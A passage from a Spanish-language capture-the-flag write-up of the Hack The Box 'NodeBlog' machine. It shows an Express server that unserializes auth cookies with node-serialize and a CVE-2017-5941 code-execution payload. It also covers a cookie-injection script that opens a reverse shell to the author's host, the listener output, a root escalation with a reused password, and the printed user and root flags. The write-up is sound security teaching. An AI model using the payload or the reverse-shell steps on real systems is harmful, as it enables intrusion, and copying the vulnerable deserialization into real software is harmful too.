<span class="mtk7 mtki">const</span> <span class=mtk1>articleRouter</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'./routes/articles'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">const</span> <span class=mtk1>loginRouter</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'./routes/login'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">const</span> <span class=mtk1>serialize</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'node-serialize'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">const</span> <span class=mtk8>methodOverride</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'method-override'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">const</span> <span class=mtk8>fileUpload</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'express-fileupload'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">const</span> <span class=mtk8>cookieParser</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'cookie-parser'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">const</span> <span class="mtk8 mtku">crypto</span> <span class=mtk5>=</span> <span class=mtk8>require</span><span class=mtk1>(</span><span class=mtk4>'crypto'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">const</span> <span class=mtk1>cookie_secret</span> <span class=mtk5>=</span> <span class=mtk4>'UHC-SecretCookie'</span>
<span class=mtk3>// const</span> <span class=mtk3>session</span> <span class=mtk3>=</span> <span class=mtk3>require('express-session')</span>
<span class="mtk7 mtki">const</span> <span class=mtk1>app</span> <span class=mtk5>=</span> <span class=mtk8>express</span><span class=mtk1>()</span>

<span class=mtk1>mongoose.</span><span class=mtk8>connect</span><span class=mtk1>(</span><span class=mtk4>'mongodb://localhost/blog'</span><span class=mtk1>)</span>

<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>set</span><span class=mtk1>(</span><span class=mtk4>'view</span> <span class=mtk4>engine'</span><span class=mtk1>,</span> <span class=mtk4>'ejs'</span><span class=mtk1>)</span>
<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>use</span><span class=mtk1>(</span><span class=mtk8>express</span><span class=mtk1>.</span><span class=mtk8>urlencoded</span><span class=mtk1>({</span> <span class=mtk1>extended</span><span class=mtk1>:</span> <span class=mtk6>false</span> <span class=mtk1>}))</span>
<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>use</span><span class=mtk1>(</span><span class=mtk8>methodOverride</span><span class=mtk1>(</span><span class=mtk4>'_method'</span><span class=mtk1>))</span>
<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>use</span><span class=mtk1>(</span><span class=mtk8>fileUpload</span><span class=mtk1>())</span>
<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>use</span><span class=mtk1>(</span><span class=mtk8>express</span><span class=mtk1>.</span><span class=mtk8>json</span><span class=mtk1>())</span>
<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>use</span><span class=mtk1>(</span><span class=mtk8>cookieParser</span><span class=mtk1>())</span>
<span class=mtk3>// app.use(session({ secret:</span> <span class=mtk3>'UHC-SecretKey-123' }))</span>

<span class="mtk7 mtki">function</span> <span class=mtk8>authenticated</span><span class=mtk1>(</span><span class="mtk9 mtki">c</span><span class=mtk1>)</span> <span class=mtk1>{</span>
    <span class=mtk5>if</span> <span class=mtk1>(</span><span class=mtk5>typeof</span> <span class="mtk9 mtki">c</span> <span class=mtk5>==</span> <span class=mtk4>'undefined'</span><span class=mtk1>)</span>
        <span class=mtk5>return</span> <span class=mtk6>false</span>

    <span class="mtk9 mtki">c</span> <span class=mtk5>=</span> <span class=mtk1>serialize.</span><span class=mtk8>unserialize</span><span class=mtk1>(</span><span class="mtk9 mtki">c</span><span class=mtk1>)</span>

    <span class=mtk5>if</span> <span class=mtk1>(</span><span class="mtk9 mtki">c</span><span class=mtk1>.sign</span> <span class=mtk5>==</span> <span class=mtk1>(</span><span class="mtk8 mtku">crypto</span><span class=mtk1>.</span><span class=mtk8>createHash</span><span class=mtk1>(</span><span class=mtk4>'md5'</span><span class=mtk1>).</span><span class=mtk8>update</span><span class=mtk1>(</span><span class=mtk1>cookie_secret</span> <span class=mtk5>+</span> <span class="mtk9 mtki">c</span><span class=mtk1>.user).</span><span class=mtk8>digest</span><span class=mtk1>(</span><span class=mtk4>'hex'</span><span class=mtk1>))) {</span>
        <span class=mtk5>return</span> <span class=mtk6>true</span>
    <span class=mtk1>}</span> <span class=mtk5>else</span> <span class=mtk1>{</span>
        <span class=mtk5>return</span> <span class=mtk6>false</span>
    <span class=mtk1>}</span>
<span class=mtk1>}</span>

<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>get</span><span class=mtk1>(</span><span class=mtk4>'/'</span><span class=mtk1>,</span> <span class=mtk5>async</span> <span class=mtk1>(</span><span class="mtk9 mtki">req</span><span class=mtk1>,</span> <span class="mtk9 mtki">res</span><span class=mtk1>)</span> <span class="mtk7 mtki">=&gt;</span> <span class=mtk1>{</span>
    <span class="mtk7 mtki">const</span> <span class=mtk1>articles</span> <span class=mtk5>=</span> <span class=mtk5>await</span> <span class=mtk1>Article.</span><span class=mtk8>find</span><span class=mtk1>().</span><span class=mtk8>sort</span><span class=mtk1>({</span>
        <span class=mtk1>createdAt</span><span class=mtk1>:</span> <span class=mtk4>'desc'</span>
    <span class=mtk1>})</span>
    <span class="mtk9 mtki">res</span><span class=mtk1>.</span><span class=mtk8>render</span><span class=mtk1>(</span><span class=mtk4>'articles/index'</span><span class=mtk1>,</span> <span class=mtk1>{</span> <span class=mtk1>articles</span><span class=mtk1>:</span> <span class=mtk1>articles</span><span class=mtk1>,</span> <span class=mtk1>ip</span><span class=mtk1>:</span> <span class="mtk9 mtki">req</span><span class=mtk1>.</span><span class=mtk1>socket</span><span class=mtk1>.</span><span class=mtk1>remoteAddress</span><span class=mtk1>,</span> <span class=mtk1>authenticated</span><span class=mtk1>:</span> <span class=mtk8>authenticated</span></span><span class=mtk1>(</span><span class="mtk9 mtki">req</span><span class=mtk1>.</span><span class=mtk1>cookies</span><span class=mtk1>.auth)</span> <span class=mtk1>})  
<span class=mtk1>})</span>

<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>use</span><span class=mtk1>(</span><span class=mtk4>'/articles'</span><span class=mtk1>,</span> <span class=mtk1>articleRouter</span><span class=mtk1>)</span>
<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>use</span><span class=mtk1>(</span><span class=mtk4>'/login'</span><span class=mtk1>,</span> <span class=mtk1>loginRouter</span><span class=mtk1>)</span>

<span class=mtk1>app</span><span class=mtk1>.</span><span class=mtk8>listen</span><span class=mtk1>(</span><span class=mtk6>5000</span><span class=mtk1>)</span>
</code></pre></div>
<p>Podríamos extraer más códigos fuente a partir del principal (por ejemplo, <code>/opt/blog/routes/login.js</code>, <code>/opt/blog/routes/articles.js</code>, <code>/opt/blog/models/user.js</code> y <code>/opt/blog/models/article.js</code>). Sin embargo, con <code>server.js</code> basta para continuar.</p>
<h2 id=encontrando-una-deserialización-insegura>Encontrando una deserialización insegura</h2>
<p>El archivo JavaScript anterior utiliza <code>node-serialize</code>, que es un módulo de Node.js utilizado para serializar y deserializar documentos JSON. Se sabe que este módulo es vulnerable a ejecución remota de comandos (RCE) mediante el método <code>unserialize</code>. Podemos encontrar más información al respecto y una sencilla prueba de concepto en <a href=https://security.snyk.io/vuln/npm:node-serialize:20170208>snyk.io</a> (CVE-2017-5941). Necesitamos introducir un <em>payload</em> como este:</p>
<div class=highlight><pre tabindex=0 style=color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class="mtk7 mtki">const</span> <span class=mtk1>serialize</span> <span class=mtk5>=</span> <span class=mtk7>require</span><span class=mtk1>(</span><span class=mtk4>'node-serialize'</span><span class=mtk1>)</span>
<span class="mtk7 mtki">const</span> <span class=mtk1>payload</span> <span class=mtk5>=</span> <span class=mtk4>`{"rce":"_$$ND_FUNC$$_function()</span> <span class=mtk4>{</span> <span class=mtk4>require(</span><span class=mtk4>'child_process'</span><span class=mtk4>).exec(</span><span class=mtk4>'ls'</span><span class=mtk4>)</span> <span class=mtk4>}()"}`</span>  
<span class=mtk1>serialize.</span><span class=mtk8>unserialize</span><span class=mtk1>(payload)</span>
</code></pre></div>
<p>El método <code>unserialize</code> se utiliza sobre la <em>cookie</em> de sesión para verificar que la firma es correcta. Por tanto, podemos añadir el <em>payload</em> a la <em>cookie</em>, ya que está en formato JSON (con codificación URL).</p>
<p>Para esta tarea, desarrollé un <em>script</em> en Node.js que se autentica y modifica la <em>cookie</em> de sesión para introducir el <em>payload</em> y obtener una <em>reverse shell</em>. El <em>script</em> se llama <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog/serialize-rce.js><code>serialize-rce.js</code></a> (explicación detallada <a href=https://github.com/7Rocky/HackTheBox-scripts/tree/main/Machines/NodeBlog#serialize-rcejs>aquí</a>).</p>
<p>Utilizando este <em>script</em>, somos capaces de acceder a la máquina como <code>admin</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>node</span> serialize-rce.js 10.10.17.44 4444  
[+] Login successful
[+] RCE completed
</code></pre></div>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight><span class=code-cyan>$</span> <span class=code-dark-green>nc</span> -nlvp 4444
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 10.10.11.139.
Ncat: Connection from 10.10.11.139:55018.
bash: cannot set terminal process group (861): Inappropriate ioctl for device  
bash: no job control in this shell
admin@nodeblog:/opt/blog$ script /dev/null -c bash
script /dev/null -c bash
Script started, file is /dev/null
admin@nodeblog:/opt/blog$ ^Z
zsh: suspended  ncat -nlvp 4444

<span class=code-cyan>$</span> <span class=code-dark-green>stty</span> raw -echo; <span class=code-dark-green>fg</span>
[1]  + continued  ncat -nlvp 4444
                                 reset xterm
admin@nodeblog:/opt/blog$ export TERM=xterm
admin@nodeblog:/opt/blog$ export SHELL=bash
admin@nodeblog:/opt/blog$ stty rows 50 columns 158
</code></pre></div>
<h2 id=escalada-de-privilegios>Escalada de privilegios</h2>
<p>Una vez como <code>admin</code>, podemos ir a su directorio personal y capturar la <em>flag</em> <code>user.txt</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>admin@nodeblog:/opt/blog$ cd
admin@nodeblog:~$ cat user.txt
7d30843b9570b5efd388820002409de2  
</code></pre></div>
<p>Además, el archivo <code>.bash_history</code> no está redirigido a <code>/dev/null</code>, por lo que podemos ver los últimos comandos ejecutados por <code>admin</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>admin@nodeblog:~$ ls -la --time-style=+
total 36
drwxrwxrwx 1 admin admin   220  <span class="code-bg-green code-blue">.</span>
drwxr-xr-x 1 root  root     10  <span class=code-blue>..</span>
-rw------- 1 admin admin  1863  .bash_history
-rw-r--r-- 1 admin admin   220  .bash_logout
-rw-r--r-- 1 admin admin  3771  .bashrc
drwx------ 1 admin admin    40  <span class=code-blue>.cache</span>
-rw------- 1 admin admin   383  .dbshell
-rw------- 1 admin admin     0  .mongorc.js
drwxrwxr-x 1 admin admin   158  <span class=code-blue>.pm2</span>
-rw-r--r-- 1 admin admin   807  .profile
-rw-r--r-- 1 admin admin     0  .sudo_as_admin_successful  
-rw------- 1 admin admin 10950  .viminfo
-rw-r--r-- 1 root  root     33  user.txt
admin@nodeblog:~$ tail .bash_history
node server.js
vi server.js
node server.js
vi server.js
node server.js
vi server.js
node server.js
vi server.js
node server.js
sudo su
</code></pre></div>
<p>Como está utilizando <code>sudo su</code>, podemos deducir que este usuario puede ser <code>root</code> utilizando <code>sudo</code>. Si utilizamos la contraseña extraída anteriormente de MongoDB, conseguimos ser <code>root</code>:</p>
<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2><code class=no-highlight>admin@nodeblog:~$ sudo su
[sudo] password for admin:
root@nodeblog:/home/admin# cd
root@nodeblog:~# cat root.txt
5ebff8f607158b4d1b78427af94f5358  
</code></pre></div>
<div class="mt6 instapaper_ignoref">
</div>
</div>
<aside aria-label=aside class="w-20-l mt6-l aside-desktop">
<div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style=position:sticky;top:2rem>
<p class="f5 b mb3">Contenidos de este write-up</p>
<nav id=TableOfContents>
<ul>
<li><a href=#escaneo-de-puertos>Escaneo de puertos</a></li>
<li><a href=#enumeración-web>Enumeración web</a></li>
<li><a href=#encontrando-una-inyección-nosql>Encontrando una inyección NoSQL</a></li>
<li><a href=#encontrando-una-inyección-xxe>Encontrando una inyección XXE</a></li>
<li><a href=#encontrando-una-deserialización-insegura>Encontrando una deserialización insegura</a></li>
<li><a href=#escalada-de-privilegios>Escalada de privilegios</a></li>
</ul>
</nav>
</div>
</aside>
</article>
</main>
<footer class="bg-black bottom-0 w-100 pa3" role=contentinfo>
<div class="flex justify-between">
<a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href=https://7rocky.github.io/ title=https://7rocky.github.io/>&copy; 7Rocky 2022</a>
<div style=margin-top:8px>
<div>
<div>
<a href=https://www.linkedin.com/in/roberto-gesteira-minarro/ target=_blank class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel=noopener aria-label="follow on LinkedIn——Opens in a new window"><svg height="32" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
<a href=https://github.com/7Rocky target=_blank class="link-transition github link dib z-999 pt3 pt0-l mr1" title="Github link" rel=noopener aria-label="follow on Github——Opens in a new window"><svg height="32" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="32" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class=new-window><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span>
</a>
</div>
</div>
</div>
</div>
</footer>
</body>
</html>